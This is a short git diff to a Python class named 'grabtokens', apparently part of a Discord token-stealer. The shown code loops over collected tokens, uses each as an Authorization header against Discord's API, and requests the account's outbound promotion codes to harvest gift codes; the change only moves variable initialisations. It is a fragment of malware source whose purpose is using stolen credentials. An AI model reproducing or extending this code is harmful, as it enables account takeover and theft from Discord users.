@@ -236,11 +236,14 @@ class grabtokens():
         for token in self.tokens:
             if token in self.tokens_sent:
                 pass
+            
+            val_codes = []
+            val = ""
+            nitro =""
 
             headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                     'Content-Type': 'application/json',
                     'Authorization': token}
-            val = ""
 
             r = requests.get(self.baseurl,headers=headers).json()
 
@@ -290,7 +293,6 @@ class grabtokens():
 
             g = requests.get("https://discord.com/api/v9/users/@me/outbound-promotions/codes",headers=headers)
                 
-            val_codes = []
             if "code" in g.text:
                 codes = json.loads(g.text)
                 try:
